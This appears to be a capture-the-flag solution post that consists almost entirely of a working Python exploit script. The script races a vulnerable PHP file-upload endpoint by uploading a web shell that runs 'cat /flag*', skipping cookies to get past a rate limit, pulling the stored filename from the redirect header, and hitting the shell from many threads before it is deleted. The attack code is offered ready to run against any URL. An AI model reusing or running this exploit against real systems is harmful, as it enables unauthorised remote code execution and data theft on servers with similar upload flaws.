I use this script 

import requests
import re
import sys
import threading

# Configuration
STOP_FLAG = False
SUCCESS_OUTPUT = ""

def attack_worker(target_url, thread_id):
    global STOP_FLAG, SUCCESS_OUTPUT
    
    upload_url = f"{target_url}/upload.php"
    
    # Simple payload to cat the flag
    filename = "race.php"
    php_payload = '<?php system("cat /flag*"); ?>'
    
    while not STOP_FLAG:
        try:
            # 1. Upload WITHOUT cookies (Bypass Rate Limit)
            files = {'imageFile': (filename, php_payload, 'application/x-php')}
            data = {'submit': '1'}
            
            # Allow_redirects=False is faster and necessary to see the header
            r = requests.post(upload_url, files=files, data=data, allow_redirects=False)
            
            # 2. Grab Filename instantly
            if 'Location' in r.headers:
                location = r.headers['Location']
                match = re.search(r'uploaded(?:\+|%20)as(?:\+|%20)([a-fA-F0-9]+_race\.php)', location)
                
                if match:
                    uploaded_filename = match.group(1)
                    shell_url = f"{target_url}/uploads/{uploaded_filename}"
                    
                    # 3. Trigger Payload Instantly
                    # We don't check if it exists first - just run it!
                    resp = requests.get(shell_url, timeout=2)
                    
                    if resp.status_code == 200:
                        content = resp.text.strip()
                        # Check if we got the flag or valid output
                        if "flag{" in content.lower() or "ctf{" in content.lower() or len(content) > 0:
                            if "Not Found" not in content:
                                print(f"\n[!!!] THREAD {thread_id} WON THE RACE! [!!!]")
                                print(f"[+] File: {shell_url}")
                                print(f"[+] Output: {content}")
                                STOP_FLAG = True
                                return
        except Exception:
            pass # Ignore errors, speed is key

def start_race(target_url, threads=10):
    target_url = target_url.rstrip('/')
    print(f"[+] Starting Race Condition Attack on {target_url}")
    print(f"[+] Launching {threads} threads...")
    print("[*] Press Ctrl+C to stop manually.")
    
    active_threads = []
    
    for i in range(threads):
        t = threading.Thread(target=attack_worker, args=(target_url, i))
        t.daemon = True
        t.start()
        active_threads.append(t)
        
    try:
        while not STOP_FLAG:
            pass # Keep main thread alive
    except KeyboardInterrupt:
        print("\n[-] Stopping...")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_race.py <URL>")
        sys.exit(1)
        
    start_race(sys.argv[1])


                            

<img width="781" height="170" alt="image" src="https://github.com/user-attachments/assets/78f203f4-a277-47d7-80dc-3fb02d493234" />

                                 
